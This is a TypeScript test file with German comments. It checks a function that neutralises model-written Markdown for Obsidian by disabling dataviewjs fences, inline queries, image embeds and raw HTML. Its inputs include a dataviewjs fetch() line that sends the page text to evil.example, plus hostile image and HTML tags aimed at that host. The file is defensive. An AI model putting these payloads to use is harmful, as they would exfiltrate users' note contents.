// Golden-Tests für neutralizeModelMarkdown — die Fälle sind eine benannte Liste, damit sie mit dem Modul ins Kit wandern
// können (Kit-Modul `safe-markdown`). Jeder Fall prüft die Sicherheitseigenschaften UND die genaue Ausgabe.
import { describe, expect, it } from "vitest";
import { neutralizeModelMarkdown } from "../src/core/chat-markdown";

const B = "`".repeat(3);
const B4 = "`".repeat(4);
const T = "~".repeat(3);

/** Eine Zeile, die Obsidian als Zaun-Öffner mit Sprach-Tag lesen könnte — nach dem Neutralisieren nur noch `text`. */
const FENCE_LINE = /^((?:[ \t>]|[-*+][ \t]|\d{1,9}[.)][ \t])*)(`{3,}|~{3,})(.*)$/;
/** Inline-Code-Span (CommonMark: gleich lange Backtick-Läufe, nicht über Absatzgrenzen). */
const CODE_SPAN = /(?<!`)(`+)(?!`)((?:(?!\n[ \t]*\n)[\s\S])*?)(?<!`)\1(?!`)/g;

/** Sicherheitseigenschaften der Ausgabe; liefert die Verstöße. */
function violations(out: string): string[] {
  const v: string[] = [];
  for (const line of out.split("\n")) {
    const m = FENCE_LINE.exec(line);
    if (m && m[3].trim() !== "" && m[3].trim() !== "text") v.push(`fence info: ${line}`);
  }
  const plain = out.split("\n").filter((l) => !FENCE_LINE.test(l)).join("\n");
  for (const m of plain.matchAll(CODE_SPAN)) {
    const c = m[2].trim();
    if (c.startsWith("=") || c.includes("$=")) v.push(`inline query: ${m[0]}`);
  }
  if (out.includes("![")) v.push("image syntax");
  if (out.includes("<")) v.push("raw <");
  return v;
}

/** [Name, Eingabe, erwartete Ausgabe] */
const GOLDEN: Array<[string, string, string]> = [
  ["Tag (dataviewjs)", `${B}dataviewjs\nfetch('https://evil.example/?q='+document.body.innerText)\n${B}`, `${B}text\nfetch('https://evil.example/?q='+document.body.innerText)\n${B}`],
  ["Tag (dataview)", `${B}dataview\nTABLE file.name\n${B}`, `${B}text\nTABLE file.name\n${B}`],
  ["Leerzeichen vor Tag", `${B} dataviewjs\ndv.el("p","x")\n${B}`, `${B}text\ndv.el("p","x")\n${B}`],
  ["Tilde-Fence", `${T}dataviewjs\ndv.el("p","x")\n${T}`, `${T}text\ndv.el("p","x")\n${T}`],
  ["eingerückt (2 Leerzeichen)", `  ${B}dataviewjs\n  dv.el("p","x")\n  ${B}`, `  ${B}text\n  dv.el("p","x")\n  ${B}`],
  ["eingerückt (5 Leerzeichen)", `     ${B}dataviewjs\n     x\n     ${B}`, `     ${B}text\n     x\n     ${B}`],
  ["in Zitat/Callout", `> [!note]\n> ${B}dataviewjs\n> x\n> ${B}`, `> [!note]\n> ${B}text\n> x\n> ${B}`],
  ["in Listenpunkt", `- ${B}dataviewjs\n  x\n  ${B}`, `- ${B}text\n  x\n  ${B}`],
  ["verschachtelte Zäune (4 Backticks um 3)", `${B4}md\n${B}dataviewjs\nx\n${B}\n${B4}`, `${B4}text\n${B}text\nx\n${B}\n${B4}`],
  ["Fence ohne Schluss", `${B}dataviewjs\ndv.el("p","x")`, `${B}text\ndv.el("p","x")`],
  ["Info-String mit Sonderzeichen", `${B}js {title="x"}\nx\n${B}`, `${B}text\nx\n${B}`],
  ["Fence ohne Info-String bleibt", `${B}\nx\n${B}`, `${B}\nx\n${B}`],
  ["Schließzaun mit Leerraum bleibt", `${B}\nx\n${B}   `, `${B}\nx\n${B}   `],
  ["Inline $=", "see `$= dv.pages().length` here", "see \\`\\$\\= dv\\.pages\\(\\)\\.length\\` here"],
  ["Inline =", "name: `= this.file.name`", "name: \\`\\= this\\.file\\.name\\`"],
  ["Inline $= mitten im Span", "`x $= y`", "\\`x \\$\\= y\\`"],
  ["Inline mit Doppel-Backticks", "``= this.file.name``", "\\`\\`\\= this\\.file\\.name\\`\\`"],
  ["harmloser Inline-Code bleibt", "set `maxRounds` to 20", "set `maxRounds` to 20"],
  ["Bild-Syntax", "a ![pic](https://evil.example/?q=1) b", "a pic (https://evil.example/?q=1) b"],
  ["Wikilink-Embed", "see ![[secret.png]]", "see `[[secret.png]]`"],
  ["Referenz-Bild", "![alt][r]\n\n[r]: https://evil.example/x", "[alt]\n\n[r]: https://evil.example/x"],
  ["rohes HTML", 'x <img src="https://evil.example"> y', 'x &lt;img src="https://evil.example"> y'],
  ["Link bleibt", "[t](https://ok.example)", "[t](https://ok.example)"],
];

describe("neutralizeModelMarkdown — Golden", () => {
  it.each(GOLDEN)("%s: sicher", (_n, input) => {
    expect(violations(neutralizeModelMarkdown(input))).toEqual([]);
  });
  it.each(GOLDEN)("%s: genaue Ausgabe", (_n, input, expected) => {
    expect(neutralizeModelMarkdown(input)).toBe(expected);
  });
});

describe("neutralizeModelMarkdown — Eigenschaften", () => {
  it("rohes HTML wird für jeden aktiven Tag escaped", () => {
    for (const tag of ["img", "iframe", "script", "video", "audio", "embed", "object", "link", "style", "svg", "div"]) {
      const out = neutralizeModelMarkdown(`x <${tag} src="https://evil.example"> y`);
      expect(out).not.toContain("<");
      expect(out).toContain(`&lt;${tag}`);
    }
  });
  const IMG = "![a](https://evil.example/?q=1)";
  const cases: Array<[string, string]> = [
    ["Backtick-Fence", `${B}\n${IMG}\n${B}`],
    ["eingerückter Fence (2 Leerzeichen)", `  ${B}\n${IMG}\n  ${B}`],
    ["~~~-Fence", `${T}\n${IMG}\n${T}`],
    ["nach unvollständigem Fence", `${B}\nx\n${IMG}`],
    ["Backticks im Info-String", `${B} a\`b\n${IMG}\n${B}`],
    ["Embed im Fence", `${B}\n![[x.png]] <img src=y>\n${B}`],
    ["Inline-Query mit Bild darin", "`$= ![a](https://evil.example)`"],
  ];
  it.each(cases)("%s: keine Bildsyntax, kein <, kein Tag, keine Inline-Query", (_n, text) => {
    expect(violations(neutralizeModelMarkdown(text))).toEqual([]);
  });
  it("ist idempotent", () => {
    for (const [, input] of GOLDEN) {
      const once = neutralizeModelMarkdown(input);
      expect(violations(neutralizeModelMarkdown(once))).toEqual([]);
    }
  });
});
